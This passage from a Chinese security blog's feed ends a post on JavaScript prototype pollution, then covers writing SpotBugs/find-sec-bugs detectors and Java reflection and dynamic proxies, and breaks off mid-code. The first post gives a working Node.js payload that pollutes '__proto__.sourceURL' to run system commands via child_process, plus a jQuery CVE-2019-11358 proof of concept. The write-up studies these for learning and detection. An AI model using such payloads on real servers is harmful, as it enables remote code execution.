title="优化payload"></a>优化payload</h2><p>上面的payload已经可以攻击成功，但是存在一个弊端就是在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务：</p><p><img src="/JS-原型链污染/1556973914607.png" alt="1556973914607"></p><p>需要用for循环把之前的污染删掉，这也就成了p神帖子里面的payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\u000areturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>题外话，当时没想清楚为啥在return之前删除可以在后面删除污染，实际上是一个简单的先后问题，即在request的时候，我们污染了<code>sourceURL</code>，接着造成代码执行（先），在执行时，污染源被清除（后），返回系统命令执行结果，这样之后的调用就不会受到原型链污染的影响了。</p><h1 id="jQuery的原型污染-CVE-2019-11358"><a href="#jQuery的原型污染-CVE-2019-11358" class="headerlink" title="jQuery的原型污染(CVE-2019-11358)"></a>jQuery的原型污染(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11358" target="_blank" rel="noopener">CVE-2019-11358</a>)</h1><p>jQuery 3.4.0以下版本（不包括3.4.0）存在原型污染漏洞。主要原因可以参考奇安信代码卫士的“<a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">jQuery CVE-2019-11358 原型污染漏洞分析和修复建议</a>”一文。</p><p>Sink出现在src/core.js代码jQuery.extend函数的<a href="https://github.com/jquery/jquery/blob/3.3.1/src/core.js#L155" target="_blank" rel="noopener">180-185行</a>：</p><p><img src="/JS-原型链污染/1557061047384.png" alt="1557061047384"></p><p>180行是一个递归调用，这里可以看到extend()参数有deep，clone，copy三个，接着<code>target[name]=copy</code>中，如果name和copy可控的话就可以进行污染了。</p><p>这两个变量当然是可控的，向上看到155-160行：</p><p><img src="/JS-原型链污染/1557061924872.png" alt="1557061924872"></p><p>arguments就是传进来的参数，先赋值给options，接着options的key就是name，value就是copy。</p><p>因此可以构造如下PoC：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode": true&#125;&#125;'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.devMode); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>可以看到，之所以说jQuery原型污染的影响不大，是因为这是一个前端漏洞，即使有漏洞，攻击者也需要根据网站（源码审计）产生EXP，当然，如果网站依赖于某些类的某些属性/方法做身份验证或其他的什么事情（例如PoC里的devMode），那么后果还是很严重的。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><p>JavaScript原型链污染，<a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">https://xz.aliyun.com/t/2735</a></p></li><li><p>深入理解 JavaScript Prototype 污染攻击，<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p></li><li><p>After three years of silence, a new jQuery prototype pollution vulnerability emerges once again，<a href="https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/" target="_blank" rel="noopener">https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/</a></p></li><li><p>jQuery CVE-2019-11358 原型污染漏洞分析和修复建议, <a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177093</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全-JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> jQuery </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spotbugs源码学习&amp;添加安全规则</title>
      <link href="/whitebox-spotbugs%E6%B7%BB%E5%8A%A0%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%99/"/>
      <url>/whitebox-spotbugs%E6%B7%BB%E5%8A%A0%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<p>因为帮我内推阿里的师傅告诉我以后可能要做源码审计的工作，先学习一下spotbugs和<a href="https://find-sec-bugs.github.io/" target="_blank" rel="noopener">find-sec-bugs</a>的扫描规则实现，并且尝试添加一个规则。</p><h1 id="添加扫描规则——添加一个Detector"><a href="#添加扫描规则——添加一个Detector" class="headerlink" title="添加扫描规则——添加一个Detector"></a>添加扫描规则——添加一个Detector</h1><p>添加扫描规则主要是继承Detector，本文介绍以下几种主要的Detector：</p><a id="more"></a><h2 id="OpcodeStackDetector"><a href="#OpcodeStackDetector" class="headerlink" title="OpcodeStackDetector"></a>OpcodeStackDetector</h2><p>检查每一个Java虚拟机操作码（继承其中的<code>sawOpcode(int seen)</code>，<code>seen</code>即操作吗int表示），其中可以获取调用的方法名——<code>getNameConstantOperand()</code>，获取调用者——<code>getClassConstantOperand()</code>，获取函数调用的参数——<code>stack.getStackItem(0)</code>。可以做类似于正则匹配的简单扫描工具。</p><p>例如扫描<code>registry.addMapping.addMapping(&quot;/**&quot;).allowedOrigins(&quot;*&quot;)</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsRegistryCORSDetector</span> <span class="keyword">extends</span> <span class="title">OpcodeStackDetector</span> </span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sawOpcode</span><span class="params">(<span class="keyword">int</span> seen)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检测调用方法名</span></span><br><span class="line">        <span class="keyword">if</span> (seen == Const.INVOKEVIRTUAL &amp;&amp; getNameConstantOperand().equals(<span class="string">"allowedOrigins"</span>)) &#123;</span><br><span class="line">            <span class="comment">// 检测调用对象</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"org/springframework/web/servlet/config/annotation/CorsRegistration"</span>.equals(getClassConstantOperand())) &#123;</span><br><span class="line">                OpcodeStack.Item item = stack.getStackItem(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 因为allowedOrigins参数时Strings... 所以不能直接提取而需要自己通过字节码提取</span></span><br><span class="line">                <span class="keyword">if</span>(item.isArray()) &#123;</span><br><span class="line">                    String[] strings=getStringArray(item);</span><br><span class="line">                    String pattern=<span class="string">"*"</span>;</span><br><span class="line">                    <span class="keyword">for</span> (String s: strings) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (s.equals(pattern)) &#123;</span><br><span class="line">                             bugReporter.reportBug(<span class="keyword">new</span> BugInstance(<span class="keyword">this</span>, <span class="string">"PERMISSIVE_CORS"</span>, HIGH_PRIORITY)</span><br><span class="line">                        .addClassAndMethod(<span class="keyword">this</span>).addSourceLine(<span class="keyword">this</span>));</span><br><span class="line">                             <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是我为find-sec-bugs提交的一个真实的Detector，其中有一个坑就是<code>allowedOrigins()</code>方法的参数是变长参数（实际上是一个数组），如果参数是String或是定长参数的话，直接用<code>stack.getStackItem(0)</code>就可以拿到参数了，现在的话就需要自己写<code>getStringArray(item)</code>方法，具体解决代码见<a href="https://github.com/find-sec-bugs/find-sec-bugs/pull/472" target="_blank" rel="noopener">find-sec-bugs#472</a></p><h2 id="BasicInjectionDetector"><a href="#BasicInjectionDetector" class="headerlink" title="BasicInjectionDetector"></a>BasicInjectionDetector</h2><p>该Detector以每次调用（invoke）为单位进行代码审计，通过污点传播技术，判断调用敏感函数时判断参数是否为用户可控（可以参考com.h3xstream.findsecbugs.file.PathTraversalDetector.java）</p><p>也可继承后重写getInjectionPoint()和getPriorityFromTaintFrame()方法，直接判断是否存在调用以及判断风险等级，这时退化成OpcodeStackDetector，例如，我们要检测CORS漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsRegistryCORSDetector</span> <span class="keyword">extends</span> <span class="title">BasicInjectionDetector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PERMISSIVE_CORS = <span class="string">"PERMISSIVE_CORS"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CORS_REGISTRY_CLASS = <span class="string">"org.springframework.web.servlet.config.annotation.CorsRegistration"</span>;</span><br><span class="line">    <span class="comment">// 需要获取函数原型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> InvokeMatcherBuilder CORS_REGISTRY_ALLOWED_ORIGINS_METHOD = invokeInstruction()</span><br><span class="line">            .atClass(CORS_REGISTRY_CLASS).atMethod(<span class="string">"allowedOrigins"</span>)</span><br><span class="line">            .withArgs(<span class="string">"([Ljava/lang/String;)Lorg/springframework/web/servlet/config/annotation/CorsRegistration;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CorsRegistryCORSDetector</span><span class="params">(BugReporter bugReporter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(bugReporter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 每次调用时都会用该函数判断是否存在漏洞</span></span><br><span class="line"><span class="comment">     * invoke：表示一次调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> InjectionPoint <span class="title">getInjectionPoint</span><span class="params">(InvokeInstruction invoke, ConstantPoolGen cpg,</span></span></span><br><span class="line"><span class="function"><span class="params">            InstructionHandle handle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">assert</span> invoke != <span class="keyword">null</span> &amp;&amp; cpg != <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 可以通过一下方法获取InvokeMatcherBuilder的class、method、Signature</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getClassName(cpg));</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getMethodName(cpg));</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getSignature(cpg));</span></span><br><span class="line">        <span class="keyword">if</span> (CORS_REGISTRY_ALLOWED_ORIGINS_METHOD.matches(invoke, cpg)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InjectionPoint(<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">0</span> &#125;, PERMISSIVE_CORS);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> InjectionPoint.NONE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回危险等级</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">getPriorityFromTaintFrame</span><span class="params">(TaintFrame fact, <span class="keyword">int</span> offset)</span> <span class="keyword">throws</span> DataflowAnalysisException </span>&#123;</span><br><span class="line">        <span class="comment">// Get the value of the Access-Control-Allow-Origin parameter (Second argument from setHeader(2nd,1rst))</span></span><br><span class="line">        Taint  originsTaint= fact.getStackValue(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (originsTaint.getConstantOrPotentialValue().contains(<span class="string">"*"</span>)) &#123; <span class="comment">//Ignore unknown/dynamic header name</span></span><br><span class="line">            <span class="keyword">return</span> Priorities.HIGH_PRIORITY;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Priorities.IGNORE_PRIORITY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里<code>getPriorityFromTaintFrame()</code>方法写的是有问题的，还是因为变长参数问题，导致<code>originsTaint.getConstantOrPotentialValue()</code>只能得到数组长度却不能拿到内容。</p><p>这里第二个难点就是获取函数原型，可以考虑是用javap：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -cp C:\Users\x5651\.m2\repository\org\springframework\spring-webmvc\5.1.6.RELEASE\spring-webmvc-5.1.6.RELEASE.jar -s org.springframework.web.servlet.config.annotation.CorsRegistration</span><br></pre></td></tr></table></figure></p><h3 id="增加一个简单的污点传播规则"><a href="#增加一个简单的污点传播规则" class="headerlink" title="增加一个简单的污点传播规则"></a>增加一个简单的污点传播规则</h3><p>一个简单的污点传播只需要定义sink点和priority就行了，以命令注入的规则为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandInjectionDetector</span> <span class="keyword">extends</span> <span class="title">BasicInjectionDetector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommandInjectionDetector</span><span class="params">(BugReporter bugReporter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(bugReporter);</span><br><span class="line">        loadConfiguredSinks(<span class="string">"command.txt"</span>, <span class="string">"COMMAND_INJECTION"</span>);</span><br><span class="line">        loadConfiguredSinks(<span class="string">"command-scala.txt"</span>, <span class="string">"SCALA_COMMAND_INJECTION"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">getPriority</span><span class="params">(Taint taint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!taint.isSafe() &amp;&amp; taint.hasTag(Taint.Tag.COMMAND_INJECTION_SAFE)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Priorities.IGNORE_PRIORITY;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.getPriority(taint);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 源码安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码安全 </tag>
            
            <tag> Java </tag>
            
            <tag> Spotbugs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射学习笔记</title>
      <link href="/java-java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/java-java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h1><h2 id="动态加载一个类"><a href="#动态加载一个类" class="headerlink" title="动态加载一个类"></a>动态加载一个类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL[] urls = <span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(<span class="string">"file:.\\out\\production\\java_reflect"</span>)&#125;;</span><br><span class="line">URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">Class clazz = classLoader.loadClass(<span class="string">"test.reflect.User"</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="寻找一个类"><a href="#寻找一个类" class="headerlink" title="寻找一个类"></a>寻找一个类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"test.reflect.User"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中的构造方法"><a href="#获取类中的构造方法" class="headerlink" title="获取类中的构造方法"></a>获取类中的构造方法</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor1=clazz.getConstructor();</span><br><span class="line">User user1 = (User) constructor1.newInstance();</span><br><span class="line"></span><br><span class="line">Constructor constructor2=clazz.getConstructor(String<span class="class">.<span class="keyword">class</span>, <span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">User user2 = (User) constructor2.newInstance(<span class="string">"lili"</span>, <span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中属性"><a href="#获取类中属性" class="headerlink" title="获取类中属性"></a>获取类中属性</h1><h2 id="获取类中公有属性"><a href="#获取类中公有属性" class="headerlink" title="获取类中公有属性"></a>获取类中公有属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Field usernameField=clazz.getField(<span class="string">"username"</span>);</span><br><span class="line">usernameField.get(user2);</span><br></pre></td></tr></table></figure><h2 id="获取类中私有属性"><a href="#获取类中私有属性" class="headerlink" title="获取类中私有属性"></a>获取类中私有属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field passwordField=clazz.getDeclaredField(<span class="string">"password"</span>);</span><br><span class="line">passwordField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">passwordField.set(user2, <span class="string">"654321"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中方法"><a href="#获取类中方法" class="headerlink" title="获取类中方法"></a>获取类中方法</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method getInfoMethod=clazz.getDeclaredMethod(<span class="string">"getInfo"</span>, <span class="keyword">int</span><span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><h2 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getInfoMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">String ret= (String) getInfoMethod.invoke(user2, <span class="number">1</span>);</span><br><span class="line">System.out.println(ret);</span><br></pre></td></tr></table></figure><h2 id="调用静态方法"><a href="#调用静态方法" class="headerlink" title="调用静态方法"></a>调用静态方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method staticMethod=clazz.getDeclaredMethod(<span class="string">"staticMethod"</span>);</span><br><span class="line">staticMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">staticMethod.invoke(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反射 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java动态代理学习笔记</title>
      <link href="/java-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/java-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>java动态代理机制可以实现使用一个抽象的中介类对任意类的任意方法进行进行代理，大致原理是运行时生成一个代理类，代理类再调用委托对象。</p><h2 id="创建委托对象的接口"><a href="#创建委托对象的接口" class="headerlink" title="创建委托对象的接口"></a>创建委托对象的接口</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="创建接口的实现"><a href="#创建接口的实现" class="headerlink" title="创建接口的实现"></a>创建接口的实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SellImpl</span> <span class="keyword">implements</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In sell method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In add method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现中介类"><a href="#实现中介类" class="headerlink" title="实现中介类"></a>实现中介类</h2><p>中介类实现java.lang.reflect.InvocationHandler接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 委托类对象</span></span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DynamicProxy</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.object=object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Before"</span>);</span><br><span class="line">        Object result = method.invoke(object, args);</span><br><span class="line">        System.out.println(<span class="string">"After"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用户调用"><a href="#用户调用" class="headerlink" title="用户调用"></a>用户调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建中介类实例</span></span><br><span class="line">        MyInvocationHandler inter = <span class="keyword">new</span> MyInvocationHandler(<span class="keyword">new</span> SellImpl());</span><br><span class="line">        <span class="comment">//加上这句将会产生一个$Proxy0.class文件，这个文件即为动态生成的代理类文件</span></span><br><span class="line">        System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>,<span class="string">"true"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取代理类实例sell</span></span><br><span class="line">        Sell sell = (Sell)(Proxy.newProxyInstance(Sell.class.getClassLoader(), new Class[] &#123;Sell.class&#125;, inter));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过代理类对象调用代理类方法，实际上会转到invoke方法调用</span></span><br><span class="line">        sell.sell();</span><br><span class="line">        sell.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><ol><li>动态生成代理类，并且动态编译，再通过反射创建对象并加载到内存中：</li></ol><pre class="mermaid">graph LR   proxy[Proxy.newProxyInstance] -- JavaPoet --> java[C$Proxy0.java]   java -- Compile --> clazz[C$Proxy0.class]   clazz -- reflect --> sell[C$Proxy0]</pre><ol><li>在调用时，C$Proxy0代理InvocationHandler，InvocationHander代理subject。</li></ol><h2 id="生成代理类源码"><a href="#生成代理类源码" class="headerlink" title="生成代理类源码"></a>生成代理类源码</h2><p>newProxyInstance就是将中介类生成代理类源代码的方法，生成的代理类如下，可以看到其包含一个InvocationHander类，实现subject的接口，使用反射调用InvocationHander：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Override;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy0</span> <span class="keyword">implements</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> InvocationHandler 